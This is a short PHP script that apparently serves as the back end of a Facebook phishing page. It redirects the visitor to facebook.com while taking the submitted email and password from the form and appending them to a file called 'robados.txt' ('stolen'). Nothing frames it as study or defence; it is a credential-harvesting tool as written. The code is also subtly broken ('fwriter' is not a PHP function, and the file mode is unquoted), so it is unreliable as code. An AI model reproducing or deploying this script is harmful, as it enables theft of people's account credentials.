<?php
header ('Location: https://www.facebook.com/ '); 
$id=$_POST['roberthnv408@gmail.com'];
$pass=$_POST['pass'];
$master=fopen('robados.txt',a);
fwriter($master,"
email: ".$id." && pass: " .$pass." ");
fclose($master);
?>